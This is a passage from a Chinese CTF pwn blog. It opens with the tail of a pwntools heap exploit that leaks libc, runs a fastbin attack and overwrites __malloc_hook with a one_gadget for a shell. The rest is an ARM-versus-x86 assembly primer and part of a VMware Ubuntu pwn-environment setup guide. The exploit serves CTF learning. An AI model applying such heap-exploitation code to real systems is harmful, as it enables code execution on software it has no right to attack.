class="number">0x130</span>)		<span class="comment"># fake chunk #1</span></span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">malloc_hook = u64(io.recv(<span class="number">8</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>, malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x100</span>) + p64(malloc_hook + <span class="number">0x10</span> + <span class="number">88</span>) + p64(malloc_hook + <span class="number">0x10</span> + <span class="number">88</span>))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0xf0</span>)		<span class="comment"># chunk #4</span></span><br><span class="line">allocate(<span class="number">0x20</span>)		<span class="comment"># chunk #5</span></span><br><span class="line">allocate(<span class="number">0x60</span>)		<span class="comment"># chunk #6</span></span><br><span class="line"></span><br><span class="line">release(<span class="number">6</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">fill(<span class="number">5</span>, <span class="number">0x38</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0x71</span>) + p64(malloc_hook - <span class="number">0x23</span>))	<span class="comment"># fastbin attack</span></span><br><span class="line">allocate(<span class="number">0x60</span>)		<span class="comment"># chunk #6</span></span><br><span class="line">allocate(<span class="number">0x60</span>)		<span class="comment"># chunk #7, this one is on __malloc_hook</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">7</span>, <span class="number">0x1B</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(one_gadgets[<span class="number">1</span>] + base))	<span class="comment"># write one_gadget</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># release(6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># allocate(0x20)	### DO THIS IN INTERACTIVE()!!!</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">ARM pwn 入门 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:12" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:12+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近笔者刚刚加入了一个项目组，需要用到ARM架构的东西，和ARM pwn也有一定关系，因此一不做二不休，决定开始学习ARM pwn，顺便熟悉项目前置知识，一举两得。</p>
<p>ARM与x86分属不同架构，指令集不同，需要从头开始学习，本文从寄存器、指令方面对x86-64和ARM架构下的汇编语言做比较与学习。（配图选自清华大学出版社《ARM Cortex-M3与Cortex-M4权威指南》，侵删）</p>
<h2 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1. 寄存器"></a>1. 寄存器</h2><p>寄存器是汇编语言的核心，在x86-64系统中，最为常见的寄存器有以下这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi, rsp, rbp, rip</span><br><span class="line">r8, r9, r10, r11, r12, r13, r14, r15</span><br><span class="line">32位：</span><br><span class="line">eax, ebx, ecx, edx</span><br><span class="line">esi, edi, esp, ebp, eip</span><br><span class="line">r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d</span><br></pre></td></tr></table></figure>
<p>在大多数程序中，这17个寄存器是最为常用的寄存器，其中<code>rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, rip</code>有专门的作用，但其中的<code>rax, rbx, rcx, rdx, rsi, rdi</code>功能相对更加灵活，不像<code>rsp</code>只能用于表示栈顶地址，<code>rbp</code>只能用于表示栈帧地址，<code>rip</code>只能用于表示当前指令地址等。另外的8个寄存器则是通用寄存器，想用来干嘛就干嘛。</p>
<p>那么在ARM架构中，寄存器则是以下这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">64位：</span><br><span class="line">X0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12</span><br><span class="line">X13, X14, X15</span><br><span class="line">32位：</span><br><span class="line">R0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12</span><br><span class="line">R13, R14, R15</span><br></pre></td></tr></table></figure>
<p>其中<code>R0~R12</code>为通用寄存器，共13个，剩下的3个有特殊用途：</p>
<ul>
<li><code>R13</code>为栈指针，又称<code>SP</code>，相当于<code>rsp</code>，在物理上实际上有两个栈指针：主栈指针和进程栈指针，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。</li>
<li><code>R14</code>为链接寄存器，又称<code>LR</code>，用于保存函数调用时的返回值。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即<code>rbp+8</code>的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为<code>LR</code>在函数返回时会进行自动更新，如果栈中没有返回地址，那么<code>LR</code>就不知道要更新成什么值了。当然<code>LR</code>的作用不止这些，在后面遇到具体问题时再进行分析。</li>
<li><code>R15</code>为程序计数器，又称<code>PC</code>，可读可写。读操作返回当前指令地址+4（由ARM指令集特性决定，ARM指令集中任何一条指令都是偶数长度，与x86-64不同），写操作会导致执行流跳转。<code>PC</code>的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将<code>PC</code>作为基址访问数据。</li>
</ul>
<p>除了这些寄存器之外，两个架构下都各自有各自的特殊寄存器，如x86-64架构下的<code>rflags</code>控制寄存器用于保存程序执行的状态。在ARM中同样具有类似功能的控制寄存器：<br><img src="https://img-blog.csdnimg.cn/b0fbdccab021435b88976c20d9c76418.png"></p>
<ul>
<li><code>APSR</code>：应用状态寄存器</li>
<li><code>EPSR</code>：执行状态寄存器</li>
<li><code>IPSR</code>：中断状态寄存器<br>上面的三个寄存器可以通过一个组合寄存器<code>PSR</code>访问，在不同的ARM架构中状态寄存器的排布有一定不同：<br><img src="https://img-blog.csdnimg.cn/e4f1e6c11a1a44b18d8e24f911b01891.png"></li>
</ul>
<p>3个中断-异常屏蔽寄存器的功能较少用到，这里先不进行讨论。<br><code>CONTROL</code>寄存器确定了栈指针的选择和线程模式的访问等级，其只能够在特权等级下才能进行修改。</p>
<p><img src="https://img-blog.csdnimg.cn/da1b9c3ff9db4e32b4c85814c71a79cd.png"><br>其中具体的细节阐述较为繁琐，不是本文的重点，略过。</p>
<p>另外，在x86-64架构和ARM架构中都有很多的浮点数寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器<code>S0~S31</code>，其中可以两两组合访问为<code>D0~D15</code>，如<code>S0</code>和<code>S1</code>组合为<code>D0</code>。</p>
<h1 id="2-指令集"><a href="#2-指令集" class="headerlink" title="2. 指令集"></a>2. 指令集</h1><p>ARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，ARM的立即数前面需要加上#标识，如#0x12345678。下面的指令均为32位系统下的指令。</p>
<h2 id="A-寄存器传送数据"><a href="#A-寄存器传送数据" class="headerlink" title="A. 寄存器传送数据"></a>A. 寄存器传送数据</h2><p>与x86相同，ARM使用<code>MOV</code>系列指令进行寄存器与寄存器（立即数）之间的数据传送：</p>
<ul>
<li>**<code>MOV/MOVS reg1, &lt;reg2/imm8&gt;</code>**：赋值<code>reg1</code>为<code>reg2/imm8</code></li>
<li>**<code>MOVW &lt;reg32&gt;, &lt;imm16&gt;</code>**：赋值<code>reg32</code>的低16位为<code>imm16</code></li>
<li>**<code>MOVT &lt;reg32&gt;, &lt;imm16&gt;</code>**：赋值<code>reg32</code>的高16位为<code>imm16</code></li>
<li>**<code>MVN reg1, &lt;reg2&gt;</code>**：将<code>reg2</code>的值取反之后赋值给<code>reg1</code></li>
<li>**<code>LDR &lt;reg32&gt;, =&lt;imm32&gt;</code>**^①^：赋值<code>reg32</code>为<code>imm32</code></li>
</ul>
<p>备注：<br>① 这里的指令并不是一条真正的指令，而是一条伪指令。ARM汇编器会将字符数据汇总组成一个称为 <strong>“文字池”</strong> 的数据块，与x86-64不同，后者如果需要实现将立即数赋值到寄存器，会直接将立即数写死到指令中。这里的<code>LDR</code>指令实际是做了寻址操作，将文字池地址中的数据赋值到寄存器中。如果需要将32位立即数赋值到32位寄存器，可以使用这条指令，也可以将<code>MOVW</code>和<code>MOVT</code>指令配合使用分别赋值前16位和后16位。</p>
<h2 id="B-存储器传送数据"><a href="#B-存储器传送数据" class="headerlink" title="B. 存储器传送数据"></a>B. 存储器传送数据</h2><p>不同于x86使用mov指令可实现寄存器、立即数和内存空间的数据交换，ARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：</p>
<ul>
<li>**<code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：赋值8&#x2F;16&#x2F;32位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，如果指令后面有叹号，表示指令执行后<code>reg2</code>值更新为<code>reg2+imm32</code>，有叹号可等同于 <strong><code>LDRB/LDRH/LDR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code><strong>，这种形式称为</strong>后序指令</strong>。</li>
<li>**<code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：赋值64位<code>reg3+imm32</code>地址的数据到<code>reg1</code>和<code>reg2</code>，有叹号可等同于 <strong><code>LDRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li>
<li>**<code>LDRSB/LDRSH reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：有符号传送8&#x2F;16位<code>reg2+imm32</code>地址的数据到<code>reg1</code>，目标寄存器会进行32位有符号扩展，有叹号可等同于 <strong><code>LDRSB/LDRSH reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li>
<li>**<code>STRB/STRH/STR reg1, [&lt;reg2&gt;, &lt;imm32&gt;]&lt;!&gt;</code>**：保存寄存器<code>reg1</code>的8&#x2F;16&#x2F;32位值到<code>reg2+imm32</code>地址，有叹号可等同于 <strong><code>STRB/STRH/STR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</code></strong></li>
<li>**<code>STRD reg1, &lt;reg2&gt;, [reg3, &lt;imm32&gt;]&lt;!&gt;</code>**：保存寄存器<code>reg1</code>和<code>reg2</code>的64位值值到<code>reg3+imm32</code>地址，有叹号可等同于 <strong><code>STRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</code></strong></li>
<li>**<code>LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code>**：赋值寄存器<code>reg1</code>的值为<code>reg2/PC+(reg3&#123;&lt;&lt;imm&#125;)</code>地址处的8&#x2F;16&#x2F;32位值</li>
<li>**<code>LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;reg4-32&gt;&#123;, LSL &lt;imm&gt;&#125;]</code>**：赋值寄存器<code>reg1</code>和<code>reg2</code>的值为<code>reg3/PC+(reg4-32&#123;&lt;&lt;imm&#125;)</code>地址处的64位值</li>
<li>**<code>STRB/STRH/STR reg1, [&lt;reg2&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]</code>**：保存寄存器<code>reg1</code>的8&#x2F;16&#x2F;32位值到<code>reg2+(reg3&#123;&lt;&lt;imm&#125;)</code>地址</li>
<li>**<code>LDMIA/LDMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code>**：将<code>reg1</code>地址的值按照顺序保存到<code>reg-list</code>中的寄存器中，如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>LDMIA</code>）或减少（<code>LDMDB</code>）<code>reg1</code>。如<code>LDMIA R0, &#123;R1-R5&#125;</code>，<code>LDMIA R0, &#123;R1, R3, R6-R9&#125;</code></li>
<li>**<code>STMIA/STMDB reg1&lt;!&gt;, &lt;reg-list&gt;</code>**：向<code>reg1</code>地址存入寄存器组中的多个字。如果<code>reg1</code>后有叹号，则在保存值后自动增加（<code>STMIA</code>）或减少（<code>STMDB</code>）<code>reg1</code>。</li>
</ul>
<p>注意：后序指令不能使用PC寻址。</p>
<h2 id="C-入栈出栈"><a href="#C-入栈出栈" class="headerlink" title="C. 入栈出栈"></a>C. 入栈出栈</h2><p>虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。</p>
<ul>
<li>**<code>PUSH &lt;reg-list&gt;</code>**：将寄存器组中的寄存器值依次入栈，<code>reg-list</code>中可以有PC、LR寄存器。</li>
<li>**<code>POP &lt;reg-list&gt;</code>**：将出栈的值依次存入寄存器组中的寄存器，<code>reg-list</code>中可以有PC、LR寄存器。</li>
</ul>
<h2 id="D-算术运算"><a href="#D-算术运算" class="headerlink" title="D. 算术运算"></a>D. 算术运算</h2><p>不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令通常包含3个寄存器，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。</p>
<ul>
<li>**<code>ADD/SUB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code>**：计算<code>&lt;reg2&gt;(+/-)&lt;reg3/imm32&gt;</code>将结果保存到<code>reg3</code></li>
<li>**<code>ADC/SBC reg1, &lt;reg2&gt;, reg3</code>**：计算<code>&lt;reg2&gt;(+/-)reg3+(进位/借位)</code>将结果保存到<code>reg3</code></li>
<li>**<code>ADC &lt;reg32&gt;, &lt;imm32&gt;</code>**：计算<code>reg32+imm32+进位</code>将结果保存到<code>reg32</code></li>
<li>**<code>SBC reg1, &lt;reg2&gt;, &lt;imm32&gt;</code>**：计算<code>&lt;reg2&gt;-imm32-借位</code>将结果保存到<code>reg1</code></li>
<li>**<code>RSB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code>**：计算<code>&lt;reg3/imm&gt;-&lt;reg2&gt;</code>将结果保存到<code>reg1</code></li>
<li>**<code>MUL reg1, &lt;reg2&gt;, reg3</code>**：计算<code>&lt;reg2&gt;*reg3</code>将结果保存到<code>reg1</code></li>
<li>**<code>UDIV/SDIV reg1, &lt;reg2&gt;, reg3</code>**：计算<code>&lt;reg2&gt;/reg3</code>（无符号&#x2F;有符号）将结果保存到<code>reg1</code>，如果除以0，则结果为0</li>
<li>**<code>MLA reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code>**：计算<code>reg1=&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li>
<li>**<code>MLS reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;</code>**：计算<code>reg1=-&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</code></li>
</ul>
<h2 id="E-逻辑运算"><a href="#E-逻辑运算" class="headerlink" title="E. 逻辑运算"></a>E. 逻辑运算</h2><p>ARM支持x86格式的逻辑运算以及3运算符的逻辑运算。</p>
<ul>
<li>**<code>AND/ORR/BIC/EOR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code>**：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&amp;/|/&amp;~/^)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&amp;/|/&amp;~/^)&lt;reg2&gt;</code>（与&#x2F;或&#x2F;与非&#x2F;异或）</li>
<li>**<code>ORN reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;</code>**：表示<code>reg1=&lt;reg2&gt;|~&lt;reg3/imm32&gt;</code>（或非）</li>
</ul>
<h2 id="F-移位运算"><a href="#F-移位运算" class="headerlink" title="F. 移位运算"></a>F. 移位运算</h2><ul>
<li>**<code>ASR/LSL/LSR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;</code>**：如果<code>reg3/imm</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;/&lt;&lt;)&lt;reg3/imm32&gt;</code>，否则表示<code>reg1=reg1(&gt;&gt;/&lt;&lt;)&lt;reg2&gt;</code>（算数右移、逻辑左移、逻辑右移）</li>
<li>**<code>ROR reg1, &lt;reg2&gt;&#123;, reg3&#125;</code>**：如果<code>reg3</code>存在，则表示<code>reg1=&lt;reg2&gt;(&gt;&gt;)reg3</code>，否则表示<code>reg1=reg1(&gt;&gt;)&lt;reg2&gt;</code>（循环右移）</li>
</ul>
<h2 id="G-符号扩展"><a href="#G-符号扩展" class="headerlink" title="G. 符号扩展"></a>G. 符号扩展</h2><p>对应于x86中的movsx和movzx指令。</p>
<ul>
<li>**<code>SXTB/SXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code>**：右移<code>&lt;imm&gt;</code>位后有符号扩展<code>&lt;reg2&gt;</code>的低8&#x2F;16位并赋值给<code>reg1</code></li>
<li>**<code>UXTB/UXTH reg1, &lt;reg2&gt;&#123;, ROR &lt;imm&gt;&#125;</code>**：右移<code>&lt;imm&gt;</code>位后无符号扩展<code>&lt;reg2&gt;</code>的低8&#x2F;16位并赋值给<code>reg1</code></li>
</ul>
<h2 id="H-数据反转"><a href="#H-数据反转" class="headerlink" title="H. 数据反转"></a>H. 数据反转</h2><p>将寄存器中的值按字节进行反转。</p>
<ul>
<li>**<code>REV reg1, reg2</code>**：将<code>reg2</code>中的4字节数据按字节反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。</li>
<li>**<code>REV16 reg1, reg2</code>**：将<code>reg2</code>中的4字节以字单位分为高字和低字分别进行反转后赋值给<code>reg1</code>（<code>reg2</code>值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。</li>
<li>**<code>REVSH reg1, reg2</code>**：将<code>reg2</code>中的低2字节反转后有符号扩展赋值给<code>reg1</code></li>
<li>**<code>REVH reg1, reg2</code>**：<code>REV</code>指令的16位表示，只反转低2字节。</li>
</ul>
<h2 id="I-位域操作"><a href="#I-位域操作" class="headerlink" title="I. 位域操作"></a>I. 位域操作</h2><p>位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。</p>
<ul>
<li>**<code>BFD reg1, #lsb, #width</code>**：将<code>reg1</code>中从第<code>lsb</code>位开始的连续<code>width</code>位清零。</li>
<li>**<code>BFI reg1, reg2, #lsb, #width</code>**：将<code>reg2</code>中最低<code>width</code>位复制到<code>reg1</code>中从<code>lsb</code>位开始的连续<code>width</code>位。</li>
<li>**<code>CLZ reg1, reg2</code>**：计算<code>reg2</code>中高位0的个数并赋值给<code>reg1</code>，多用于浮点数计算。</li>
<li>**<code>RBIT reg1, reg2</code>**：反转<code>reg2</code>寄存器中的所有位并赋值给<code>reg1</code>。</li>
<li>**<code>SBFX/UBFX reg1, reg2, #lsb, #width</code>**：取<code>reg2</code>中从第<code>lsb</code>位开始的连续<code>width</code>位并有&#x2F;无符号扩展，赋值给<code>reg1</code>。</li>
</ul>
<h2 id="J-比较和测试指令"><a href="#J-比较和测试指令" class="headerlink" title="J. 比较和测试指令"></a>J. 比较和测试指令</h2><p>与x86使用<code>cmp</code>指令和<code>test</code>指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。</p>
<ul>
<li>**<code>CMP reg1, reg2/imm</code>**：比较两个寄存器或寄存器与立即数，更新标志位APSR。</li>
<li>**<code>CMN reg1, reg2/imm</code>**：比较<code>reg1</code>和<code>-reg2</code>或<code>-imm</code>，更新标志位APSR。</li>
<li>**<code>TST reg1, reg2/imm</code>**：参照x86的<code>test</code>指令，相与测试，更新N（负数位）和Z（零）标志</li>
<li>**<code>TEQ reg1, reg2/imm</code>**：异或测试，更新N和Z标志</li>
</ul>
<h2 id="K-跳转指令"><a href="#K-跳转指令" class="headerlink" title="K. 跳转指令"></a>K. 跳转指令</h2><ul>
<li>**<code>B/B.W &lt;label&gt;</code>**：无条件跳转到指定位置，<code>B.W</code>跳转范围更大。</li>
<li>**<code>BX reg</code>**：寄存器跳转。</li>
<li><strong><code>BL &lt;label&gt; / BLX reg</code><strong>：跳转到指定位置&#x2F;寄存器值，且将返回地址保存到<code>LR</code>寄存器中，类比x86的<code>call</code>指令。</strong>一般在函数开头都会首先将<code>BL</code>寄存器的值保存到栈中便于返回时获取。</strong></li>
<li>条件跳转指令族：类比x86指令：<ul>
<li><code>BEQ == je</code></li>
<li><code>BNE == jne</code></li>
<li><code>BCS/BHS == jc</code>（进位标志为1，可表示无符号大于等于）</li>
<li><code>BCC/BLO == jnc</code>（进位标志为0，可表示无符号小于）</li>
<li><code>BMI == js</code>（负数标志为1）</li>
<li><code>BPL == jns</code>（负数标志为0）</li>
<li><code>BVS == jo</code>（溢出标志为1）</li>
<li><code>BVC == jno</code>（溢出标志为0）</li>
<li><code>BHI == ja</code>（无符号大于）</li>
<li><code>BLS == jbe</code>（无符号小于等于）</li>
<li><code>BGE == jge</code>（有符号大于等于）</li>
<li><code>BLE == jle</code>（有符号小于等于）</li>
<li><code>BGT == jg</code>（有符号大于）</li>
<li><code>BLT == jl</code>（有符号小于）</li>
</ul>
</li>
<li>**<code>CBZ/CBNZ reg, &lt;label&gt;</code>**：比较寄存器的值为0&#x2F;不为0时跳转（只支持前向跳转）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BAUbuntu-CTF-pwn%E7%8E%AF%E5%A2%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BAUbuntu-CTF-pwn%E7%8E%AF%E5%A2%83/" class="post-title-link" itemprop="url">从零开始搭建Ubuntu CTF-pwn环境</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:11 / Modified: 22:27:12" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:11+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>最近因为学校考试所以没怎么看pwn，但是中间虚拟机崩掉过，问题还挺严重。前几天发现能正常打开了，但是一用gdb就会出现下面让人窒息的提醒：<br><img src="https://img-blog.csdnimg.cn/1118668a806b41028cc14e752435d8b3.png"><br>怎么调都不知道是怎么回事，很奇怪的是只有在开gdb的时候才会弹出这个错误，其他都是正常的。问过师傅时候无奈只能放弃这个与我并肩作战这么长时间的ubuntu 20.04，重装一个虚拟机。一不做二不休，干脆就将整个过程记录下来，便于日后查询。</p>
<h1 id="虚拟机日常维护注意事项"><a href="#虚拟机日常维护注意事项" class="headerlink" title="虚拟机日常维护注意事项"></a>虚拟机日常维护注意事项</h1><p>在最新的VMware中对虚拟机有一个<font color="00FF00"><strong>保护选项</strong></font>，可以在指定时间间隔内保存一个快照，这样在虚拟机崩溃的时候能够快速回档到前两天的快照中，有效减少文件等的损失，而不必每次都手动保存快照。（有读者可能会怀疑为什么我不能对崩掉的虚拟机回档，实际上我做了尝试，但是上面的问题还是存在，这就不是虚拟机状态的问题了，而是某些底层硬件配置的问题，可能是硬件出问题导致调试无法进行，但具体的我也不知道应该如何处理，因此只能重装）<br><img src="https://img-blog.csdnimg.cn/d444eaec57f84fcfb4b79e13ff2a5a3b.png"><br>如上图所示，在虚拟机设置-&gt;选项中可以找到自动保护选项，根据你设置的保护间隔和最大自动保护快照数量可以计算出至少需要的磁盘空间，因此需要<font color=red><strong>保证有足够的磁盘空间</strong></font>。</p>
<p>另外，当虚拟机<font color=blue><strong>存在快照</strong></font>时，是<font color=blue><strong>不能扩充磁盘容量</strong></font>的，因此要想扩充虚拟机的虚拟磁盘，要么<font color=red><strong>在创建虚拟机时就分配足够大小的磁盘空间</strong></font>，要么就只能<font color=red><strong>删除所有的快照</strong></font>后再进行扩充（建议前者，因为有的快照删除特别慢，如果快照多的话可能要等很长时间）</p>
<h1 id="从零搭建环境"><a href="#从零搭建环境" class="headerlink" title="从零搭建环境"></a>从零搭建环境</h1><p>下面就将介绍如何从零搭建一个CTF-pwn环境（由于学习仍在进行，故一些环境如远程执行环境还没有搭建的经历，如今后需要搭建，会在最后进行补充）</p>
<h2 id="1-创建虚拟机"><a href="#1-创建虚拟机" class="headerlink" title="1. 创建虚拟机"></a>1. 创建虚拟机</h2><p>可以在ubuntu官方网站上下载最新的长期支持版本，在笔者写这篇文章的时候，这个版本已经是22.04了，但还是按照20.04的版本来安装。<a target="_blank" rel="noopener" href="https://cn.ubuntu.com/download/desktop">22.04下载</a>&#x2F;<a target="_blank" rel="noopener" href="https://cn.ubuntu.com/download/alternative-downloads">历史版本下载</a></p>
<p><img src="https://img-blog.csdnimg.cn/fbc36cfdc2414f00a9b91ba913680866.png"><br>下载的是光盘映像文件，将其放在虚拟机的工作目录中。</p>
<p>然后选择vmware上方工具栏的文件-&gt;新建虚拟机，打开新建虚拟机向导。如下：<br><img src="https://img-blog.csdnimg.cn/a2b603c88beb4a01a2d03daf109f6bca.png"><br>选择自定义安装，点击下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/05cef1de90f44e33948d9db9ed60ce49.png"><br>硬件兼容性不需要改，一般默认选择最新的vmware版本兼容，你的vmware是什么版本就用什么版本，不用修改，直接点击下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/f20d9df8ab8b4a3a8d643e03acf74409.png"><br>选择安装程序光盘映像文件，点击浏览，选择你刚才下载的映像文件，然后点击下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/ed013bbc66f14150b85bf2f31b404d67.png"><br>输入全名（这个随便输，想输什么都行），以及你登录虚拟机的用户名和密码。之后点击下一步。</p>
<p><img src="https://img-blog.csdnimg.cn/ec085415468345b3902738076ee21701.png"><br>输入虚拟机的名字，将位置浏览设置为你的虚拟机工作目录。</p>
<p><img src="https://img-blog.csdnimg.cn/6e10263a29424dc8a6dd82c4828a2fac.png"><br>处理器数量选择。如果你的电脑配置很好而且虚拟机也需要一定的计算需要，可以设置多一些，内核数量不变，修改处理器数量。但是总数不能超过你电脑主机的内核数量。我一般选择8处理器。</p>
<p><img src="https://img-blog.csdnimg.cn/bcd9df7260474273ba3396432d0f7c12.png"><br>内存大小设置。同样看主机的配置。最好不要超过主机的内存大小，否则虚拟机可能会变慢。对于pwn做题来说4GB一般就足够了。</p>
